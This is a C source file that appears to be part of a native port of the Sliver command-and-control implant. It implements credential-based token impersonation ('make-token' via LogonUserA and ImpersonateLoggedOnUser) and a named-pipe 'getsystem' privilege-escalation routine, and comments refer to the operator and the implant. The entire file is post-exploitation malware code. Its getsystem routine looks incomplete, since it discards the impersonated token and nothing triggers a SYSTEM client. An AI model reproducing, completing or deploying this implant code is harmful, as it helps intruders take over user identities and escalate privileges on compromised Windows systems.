/* src/platform/win32/token.c - make-token and getsystem. */
#include "sliver/token.h"

#include "sliver/log.h"

#include <windows.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* LogonUser + ImpersonateLoggedOnUser, same shape as the Go implant. */
static unsigned long g_token_error = 0;

unsigned long sliver_token_last_error(void) { return g_token_error; }

/* DOMAIN\user of the token this thread is currently running as (falls back to
 * the process token). The Go implant reports the same shape; getenv("USERNAME")
 * used to return a bare user name that did not change after make-token. */
int sliver_token_owner(char *out, size_t cap) {
  HANDLE token = NULL;
  DWORD needed = 0;
  char *buf = NULL;
  TOKEN_USER *user;
  char name[256];
  char domain[256];
  DWORD name_len = (DWORD)sizeof(name);
  DWORD domain_len = (DWORD)sizeof(domain);
  SID_NAME_USE type;

  if (out == NULL || cap == 0) {
    return -1;
  }
  out[0] = '\0';
  if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &token)) {
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
      return -1;
    }
  }
  (void)GetTokenInformation(token, TokenUser, NULL, 0, &needed);
  if (needed == 0) {
    (void)CloseHandle(token);
    return -1;
  }
  buf = (char *)malloc(needed);
  if (buf == NULL) {
    (void)CloseHandle(token);
    return -1;
  }
  if (!GetTokenInformation(token, TokenUser, buf, needed, &needed)) {
    free(buf);
    (void)CloseHandle(token);
    return -1;
  }
  user = (TOKEN_USER *)buf;
  if (!LookupAccountSidA(NULL, user->User.Sid, name, &name_len, domain, &domain_len, &type)) {
    free(buf);
    (void)CloseHandle(token);
    return -1;
  }
  if (domain[0] != '\0') {
    (void)snprintf(out, cap, "%s\\%s", domain, name);
  } else {
    (void)snprintf(out, cap, "%s", name);
  }
  free(buf);
  (void)CloseHandle(token);
  return 0;
}

int sliver_make_token(const char *username, const char *password, const char *domain,
                      uint32_t logon_type) {
  HANDLE token = NULL;
  BOOL ok;
  DWORD type = (DWORD)logon_type;
  /* LogonUser accepts these; the sliver client sends
   * LOGON_NEW_CREDENTIALS (9) for the "net use"-style case, which used to be
   * rewritten to INTERACTIVE and silently changed the operator's intent. */
  if (type != LOGON32_LOGON_INTERACTIVE && type != LOGON32_LOGON_NETWORK &&
      type != LOGON32_LOGON_BATCH && type != LOGON32_LOGON_SERVICE &&
      type != LOGON32_LOGON_UNLOCK && type != LOGON32_LOGON_NETWORK_CLEARTEXT &&
      type != LOGON32_LOGON_NEW_CREDENTIALS) {
    LOG_DEBUG("token: logon type %lu not supported by LogonUser, using INTERACTIVE",
              (unsigned long)type);
    type = LOGON32_LOGON_INTERACTIVE;
  }

  if (username == NULL || username[0] == 0) {
    return -1;
  }
  ok = LogonUserA(username, domain != NULL && domain[0] != 0 ? domain : NULL,
                  password != NULL ? password : "", type, LOGON32_PROVIDER_DEFAULT, &token);
  if (!ok) {
    g_token_error = (unsigned long)GetLastError();
    LOG_DEBUG("token: LogonUser(%s\\%s) failed (%lu)", domain, username, g_token_error);
    return -1;
  }
  ok = ImpersonateLoggedOnUser(token);
  if (!ok) {
    LOG_DEBUG("token: ImpersonateLoggedOnUser failed (%lu)", (unsigned long)GetLastError());
  }
  (void)CloseHandle(token);
  return ok ? 0 : -1;
}

/* Named-pipe impersonation with a bounded wait: an unbounded ConnectNamedPipe
 * froze the session (client saw "implant timeout"). */
int sliver_get_system(void) {
  char name[128];
  HANDLE pipe;
  OVERLAPPED ov;
  BOOL ok;

  (void)snprintf(name, sizeof(name), "\\\\.\\pipe\\sliver_%lu_%lu",
                 (unsigned long)GetCurrentProcessId(), (unsigned long)GetTickCount());
  pipe = CreateNamedPipeA(name, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
                          PIPE_TYPE_MESSAGE | PIPE_WAIT | PIPE_REJECT_REMOTE_CLIENTS, 1, 4096,
                          4096, 0, NULL);
  if (pipe == INVALID_HANDLE_VALUE) {
    LOG_DEBUG("token: CreateNamedPipe failed (%lu)", (unsigned long)GetLastError());
    return -1;
  }
  memset(&ov, 0, sizeof(ov));
  ov.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
  ok = ConnectNamedPipe(pipe, &ov) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
  if (!ok && GetLastError() == ERROR_IO_PENDING) {
    /* No SYSTEM client shows up in a normal session: wait 3 s, then give up. */
    if (WaitForSingleObject(ov.hEvent, 3000) == WAIT_OBJECT_0) {
      DWORD dummy = 0;
      ok = GetOverlappedResult(pipe, &ov, &dummy, FALSE);
    }
  }
  if (ov.hEvent != NULL) {
    (void)CloseHandle(ov.hEvent);
  }
  if (ok && ImpersonateNamedPipeClient(pipe)) {
    HANDLE token = NULL;
    BOOL got = OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_QUERY, TRUE, &token);
    (void)RevertToSelf();
    if (token != NULL) {
      (void)CloseHandle(token);
    }
    (void)DisconnectNamedPipe(pipe);
    (void)CloseHandle(pipe);
    return got ? 0 : -1;
  }
  LOG_DEBUG("token: getsystem failed (%lu)", (unsigned long)GetLastError());
  (void)DisconnectNamedPipe(pipe);
  (void)CloseHandle(pipe);
  return -1;
}


